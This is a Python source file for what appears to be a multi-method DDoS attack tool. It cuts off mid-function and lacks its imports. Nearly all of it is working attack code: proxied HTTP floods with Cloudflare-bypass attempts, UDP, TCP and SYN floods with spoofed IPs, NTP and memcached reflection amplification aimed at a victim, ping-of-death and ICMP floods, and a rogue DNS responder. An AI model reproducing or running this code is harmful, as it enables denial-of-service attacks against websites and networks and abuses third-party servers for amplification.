#!/usr/bin/env python3
# -*- coding: utf-8 -*-

l7 = ["CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "OSTRESS", "DYN", "SLOW", "HEAD", "HIT", "NULL", "COOKIE", "BRUST", "PPS", "EVEN", "GSB", "DGB", "AVB"]
l4 = ["TCP", "UDP", "SYN", "VSE", "MEM", "NTP"]
l3 = ["POD", "ICMP"]
to = ["CFIP", "DNS", "PING", "CHECK", "DSTAT", "INFO"]
ot = ["STOP", "TOOLS", "HELP"]
methods = l7 + l4 + l3
methodsl = l7 + l4 + l3 + to + ot


def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled


def start_attack(method, threads, event, socks_type):
    global out_file
    # layer7
    cmethod = str(method.upper())
    if (cmethod != "HIT") and (cmethod not in l4) and (cmethod not in l3) and (cmethod != "OSTRESS"):
        out_file = str("files/proxys/" + sys.argv[5])
        proxydl(out_file, socks_type)
        print("{} Attack Started To {}:{} For {} Seconds With {}/{} Proxy ".format(method, target, port, sys.argv[7],len(proxies), str(nums)))
    else:
        print("{} Attack Started To {}:{} For {} Seconds".format(method, target, port, sys.argv[7]))
    try:
        if method == "post":
            for _ in range(threads):
                threading.Thread(target=post, args=(event, socks_type), daemon=True).start()
        elif method == "brust":
            for _ in range(threads):
                threading.Thread(target=brust, args=(event, socks_type), daemon=True).start()
        elif method == "get":
            for _ in range(threads):
                threading.Thread(target=http, args=(event, socks_type), daemon=True).start()
        elif method == "pps":
            for _ in range(threads):
                threading.Thread(target=pps, args=(event, socks_type), daemon=True).start()
        elif method == "even":
            for _ in range(threads):
                threading.Thread(target=even, args=(event, socks_type), daemon=True).start()
        elif method == "ovh":
            for _ in range(threads):
                threading.Thread(target=ovh, args=(event, socks_type), daemon=True).start()
        elif method == "capb":
            for _ in range(threads):
                threading.Thread(target=capb, args=(event, socks_type), daemon=True).start()
        elif method == "cookie":
            for _ in range(threads):
                threading.Thread(target=cookie, args=(event, socks_type), daemon=True).start()
        elif method == "tor":
            for _ in range(threads):
                threading.Thread(target=tor, args=(event, socks_type), daemon=True).start()
        elif method == "bypass":
            for _ in range(threads):
                threading.Thread(target=bypass, args=(event, socks_type), daemon=True).start()
        elif method == "head":
            for _ in range(threads):
                threading.Thread(target=head, args=(event, socks_type), daemon=True).start()
        elif method == "stress":
            for _ in range(threads):
                threading.Thread(target=stress, args=(event, socks_type), daemon=True).start()
        elif method == "ostress":
            for _ in range(threads):
                threading.Thread(target=ostress, args=(event, socks_type), daemon=True).start()
        elif method == "null":
            for _ in range(threads):
                threading.Thread(target=null, args=(event, socks_type), daemon=True).start()
        elif method == "cfb":
            for _ in range(threads):
                threading.Thread(target=cfb, args=(event, socks_type), daemon=True).start()
        elif method == "avb":
            for _ in range(threads):
                threading.Thread(target=AVB, args=(event, socks_type), daemon=True).start()
        elif method == "gsb":
            for _ in range(threads):
                threading.Thread(target=gsb, args=(event, socks_type), daemon=True).start()
        elif method == "dgb":
            for _ in range(threads):
                threading.Thread(target=dgb, args=(event, socks_type), daemon=True).start()
        elif method == "dyn":
            for _ in range(threads):
                threading.Thread(target=dyn, args=(event, socks_type), daemon=True).start()
        elif method == "hit":
            for _ in range(threads):
                threading.Thread(target=hit, args=(event, timer), daemon=True).start()

        # layer4

        elif method == "vse":
            for _ in range(threads):
                threading.Thread(target=vse, args=(event, timer), daemon=True).start()
        elif method == "udp":
            for _ in range(threads):
                threading.Thread(target=udp, args=(event, timer), daemon=True).start()
        elif method == "tcp":
            for _ in range(threads):
                threading.Thread(target=tcp, args=(event, timer), daemon=True).start()
        elif method == "syn":
            for _ in range(threads):
                threading.Thread(target=syn, args=(event, timer), daemon=True).start()
        elif method == "mem":
            for _ in range(threads):
                threading.Thread(target=mem, args=(event, timer), daemon=True).start()
        elif method == "ntp":
            for _ in range(threads):
                threading.Thread(target=ntp, args=(event, timer), daemon=True).start()

        # layer3
        elif method == "icmp":
            for _ in range(threads):
                threading.Thread(target=icmp, args=(event, timer), daemon=True).start()
        elif method == "pod":
            for _ in range(threads):
                threading.Thread(target=pod, args=(event, timer), daemon=True).start()
    except:
        pass

def random_data():
    return str(Choice(strings) + str(Intn(0, 271400281257)) + Choice(strings) + str(Intn(0, 271004281257)) + Choice(
        strings) + Choice(strings) + str(Intn(0, 271400281257)) + Choice(strings) + str(Intn(0, 271004281257)) + Choice(
        strings))


def Headers(method):
    header = ""
    if method == "get" or method == "head":
        connection = "Connection: Keep-Alive\r\n"
        accept = Choice(acceptall) + "\r\n"
        referer = "Referer: " + referers + target + path + "\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = referer + useragent + accept + connection + "\r\n\r\n"
    elif method == "cookie":
        connection = "Connection: Keep-Alive\r\n"
        more = "cache-control: no-cache\r\n"
        parm = "pragma: no-cache\r\n"
        up = "upgrade-insecure-requests: 1"
        connection += "Cookies: " + str(secrets.token_urlsafe(16)) + "\r\n"
        accept = Choice(acceptall) + "\r\n"
        referer = "Referer: " + referers + target + path + "\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = referer + useragent + accept + connection + more + up + parm + "\r\n\r\n"
    elif method == "brust":
        connection = "Connection: Keep-Alive\r\n"
        more = "Cache-Control: max-age=0\r\n"
        more2 = "Via: 1.0 PROXY\r\n"
        proxyd = str(proxy)
        xfor = "X-Forwarded-For: " + proxyd + "\r\n"
        accept = "Accept: */*\r\n"
        referer = "Referer: " + referers + target + path + "\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = referer + useragent + accept + connection + more + xfor + more2 + "\r\n\r\n"
    elif method == "even":
        up = "Upgrade-Insecure-Requests: 1\r\n"
        referer = "Referer: " + referers + target + path + "\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        proxyd = str(proxy)
        xfor = "X-Forwarded-For: " + proxyd + "\r\n"
        header = referer + useragent + up + xfor + "\r\n\r\n"
    elif method == "ovh":
        accept = Choice(acceptall) + "\r\n"
        more = "Connection: keep-alive\r\n"
        connection = "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        up = "Upgrade-Insecure-Requests: 1\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = useragent + more + accept + up + "\r\n\r\n"
    elif method == "pps":
        header = "GET / HTTP/1.1\r\n\r\n"
    elif method == "dyn":
        connection = "Connection: Keep-Alive\r\n"
        accept = Choice(acceptall) + "\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        referer = "Referer: " + referers + target + path + "\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = referer + useragent + accept + connection + "\r\n\r\n"
    elif method == "socket":
        header = ""
    elif method == "null":
        connection = "Connection: null\r\n"
        accept = Choice(acceptall) + "\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        referer = "Referer: null\r\n"
        useragent = "User-Agent: null\r\n"
        header = referer + useragent + accept + connection + "\r\n\r\n"
    elif method == "post":
        post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        refer = "Referer: http://" + target + path + "\r\n"
        user_agent = "User-Agent: " + UserAgent + "\r\n"
        accept = Choice(acceptall) + "\r\n"
        connection = "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        data = str(random._urandom(8))
        length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
        header = post_host + accept + connection + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
    elif method == "hit":
        post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        refer = "Referer: http://" + target + path + "\r\n"
        user_agent = "User-Agent: " + UserAgent + "\r\n"
        connection = "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        accept = Choice(acceptall) + "\r\n"
        data = str(random._urandom(8))
        length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
        header = post_host + accept + connection + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
    return header


def UrlFixer(original_url):
    global target, path, port, protocol
    original_url = original_url.strip()
    url = ""
    path = "/"
    port = 80
    protocol = "http"
    if original_url[:7] == "http://":
        url = original_url[7:]
    elif original_url[:8] == "https://":
        url = original_url[8:]
        protocol = "https"
    tmp = url.split("/")
    website = tmp[0]
    check = website.split(":")
    if len(check) != 1:
        port = int(check[1])
    else:
        if protocol == "https":
            port = 443
    target = check[0]
    if len(tmp) > 1:
        path = url.replace(website, "", 1)


def udp(event, timer):
    event.wait()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < timer:
        try:
            try:
                data = random._urandom(int(Intn(1024, 60000)))
                for _ in range(multiple):
                    s.sendto(data, (str(target), int(port)))
            except:
                s.close()
        except:
            s.close()
            
def icmp(event, timer):
    event.wait()
    while time.time() < timer:
        try:
            for _ in range(multiple):
                packet = random._urandom(int(Intn(1024, 60000)))
                pig(target, count=10, interval=0.2, payload_size=len(packet), payload=packet)
        except:
            pass

ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4


def ntp(event, timer):
    packets = Intn(10, 150)
    server = Choice(ntpsv)
    event.wait()
    while time.time() < timer:
        try:
            packet = (
                    IP(dst=server, src=target)
                    / UDP(sport=Intn(1, 65535), dport=int(port))
                    / Raw(load=ntp_payload)
            )
            try:
                for _ in range(multiple):
                    send(packet, count=packets, verbose=False)
            except:
                pass
        except:
            pass


mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"


def mem(event, timer):
    event.wait()
    packets = Intn(1024, 60000)
    server = Choice(memsv)
    while time.time() < timer:
        try:
            try:
                packet = (
                        IP(dst=server, src=target)
                        / UDP(sport=port, dport=11211)
                        / Raw(load=mem_payload)
                )
                for _ in range(multiple):
                    send(packet, count=packets, verbose=False)
            except:
                pass
        except:
            pass

def tcp(event, timer):
    event.wait()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while time.time() < timer:
        try:
            data = random._urandom(int(Intn(1024, 60000)))
            address = (str(target), int(port))
            try:
                s.connect(address)
                for _ in range(multiple):
                    s.send(data)
            except:
                s.close()
        except:
            s.close()

def vse(event, timer):
    event.wait()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while time.time() < timer:
        try:
            address = (str(target), int(port))
            try:
                s.connect(address)
                for _ in range(multiple):
                    s.send(data)
            except:
                s.close()
        except:
            s.close()
class DNSQuery:
    def __init__(self, data):
        self.data = data
        self.dominio = ''
        self.DnsType = ''

        HDNS=data[-4:-2].encode("hex")
        if HDNS == "0001":
            self.DnsType='A'
        elif HDNS == "000f":
            self.DnsType='MX'
        elif HDNS == "0002":
            self.DnsType='NS'
        elif HDNS == "0010":
            self.DnsType="TXT"
        else:
            self.DnsType="Unknown"

        tipo = (ord(data[2]) >> 3) & 15   # Opcode bits
        if tipo == 0:                     # Standard query
            ini=12
            lon=ord(data[ini])
            while lon != 0:
                self.dominio+=data[ini+1:ini+lon+1]+'.'
                ini+=lon+1
                lon=ord(data[ini])
    def respuesta(self, ip):
        packet=''
        if self.dominio:
            packet+=self.data[:2] + "\x81\x80"
            packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Questions and Answers Counts
            packet+=self.data[12:]                                         # Original Domain Name Question
            packet+='\xc0\x0c'                                             # Pointer to domain name
            packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Response type, ttl and resource data length -> 4 bytes
            packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # 4bytes of IP
        return packet

def dns(event, timer):
    event.wait()
    while time.time() < timer:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.bind(('',53))
            data, addr = s.recvfrom(1024)
            p = DNSQuery(data)
            for _ in range(multiple):
                s.sendto(p.respuesta(target), addr)
        except:
            s.close()
            
def syn(event, timer):
    event.wait()
    while time.time() < timer:
        try:
            IP_Packet = IP ()
            IP_Packet.src = randomIP()
            IP_Packet.dst = target

            TCP_Packet = TCP ()
            TCP_Packet.sport = randint(1, 65535)
            TCP_Packet.dport = int(port)
            TCP_Packet.flags = "S"
            TCP_Packet.seq = randint(1000, 9000)
            TCP_Packet.window = randint(1000, 9000)
            for _ in range(multiple):
                send(IP_Packet/TCP_Packet, verbose=0)
        except:
            pass


def pod(event, timer):
    event.wait()
    while time.time() < timer:
        try:
            rand_addr = spoofer()
            ip_hdr = IP(src=rand_addr, dst=target)
            packet = ip_hdr / ICMP() / ("m" * 60000)
            send(packet)
        except:
            pass


def stop():
    print('All Attacks Stopped !')
    os.system('pkill python*')
    exit()


def dyn(event, socks_type):
    header = Headers("dyn")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + random_data() + "." + target + "\r\n"

    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def http(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()

def capb(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()

def ovh(event, socks_type):
    header = Headers("ovh")
    proxy = Choice(proxies).strip().split(":")
    get_host = "HEAD " + path + "/" + str(Intn(1111111111, 9999999999)) + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def pps(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    request = Headers("pps")
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def even(event, socks_type):
    global proxy
    proxy = Choice(proxies).strip().split(":")
    header = Headers("even")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def brust(event, socks_type):
    global proxy
    proxy = Choice(proxies).strip().split(":")
    header = Headers("brust")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def cookie(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("cookie")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def cfb(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            cfscrape.create_scraper(sess=s)
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()


# def tor(event, socks_type):
    # event.wait()
    # while time.time() < timer:
        # with tor_requests_session() as s:
            # s.get(sys.argv[2])


def AVB(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    event.wait()
    payload = str(random._urandom(64))
    while time.time() < timer:
        try:
            s = cfscrape.create_scraper()
            if socks_type == 5 or socks_type == 4:
                s.proxies['http'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
                s.proxies['https'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
            if socks_type == 1:
                s.proxies['http'] = 'http://' + str(proxy[0]) + ":" + str(proxy[1])
                s.proxies['https'] = 'https://' + str(proxy[0]) + ":" + str(proxy[1])
            if protocol == "https":
                s.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
            try:
                for _ in range(multiple):
                    s.post(sys.argv[2], timeout=1, data=payload)
            except:
                s.close()
        except:
            s.close()


def bypass(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    event.wait()
    payload = str(random._urandom(64))
    while time.time() < timer:
        try:
            s = requests.Session()
            if socks_type == 5 or socks_type == 4:
                s.proxies['http'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
                s.proxies['https'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
            if socks_type == 1:
                s.proxies['http'] = 'http://' + str(proxy[0]) + ":" + str(proxy[1])
                s.proxies['https'] = 'https://' + str(proxy[0]) + ":" + str(proxy[1])
            if protocol == "https":
                s.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
            try:
                for _ in range(multiple):
                    s.post(sys.argv[2], timeout=1, data=payload)
            except:
                s.close()
        except:
            s.close()


def dgb(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    event.wait()
    while time.time() < timer:
        try:
            s = cfscrape.create_scraper()
            if socks_type == 5 or socks_type == 4:
                s.proxies['http'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
                s.proxies['https'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
            if socks_type == 1:
                s.proxies['http'] = 'http://' + str(proxy[0]) + ":" + str(proxy[1])
                s.proxies['https'] = 'https://' + str(proxy[0]) + ":" + str(proxy[1])
            if protocol == "https":
                s.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
            try:
                sleep(5)
                for _ in range(multiple):
                    s.get(sys.argv[2])
            except:
                s.close()
        except:
            s.close()


def head(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("head")
    head_host = "HEAD " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = head_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def null(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("null")
    head_host = "HEAD " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = head_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def gsb(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("head")
    head_host = "HEAD " + path + "?q=" + str(Intn(000000000, 999999999)) + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = head_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                sleep(5)
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def hit(event, timer):
    global s
    request = Headers("hit")
    event.wait()
    while time.time() < timer:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(target), int(port)))
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def cfbc(event, socks_type):
    request = Headers("cfb")
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def post(event, socks_type):
    request = Headers("post")
    proxy = Choice(proxies).strip().split(":")
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def stress(event, socks_type):
    request = Headers("stress")
    proxy = Choice(proxies).strip().split(":")
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def ostress(event, timer):
    request = Headers("stress")
    event.wait()
    while time.time() < timer:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(target), int(port)))
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()


socket_list = []
t = 0

def slow(conn, socks_type):
    global t
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    header = Headers("get")
    request = get_host + header
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
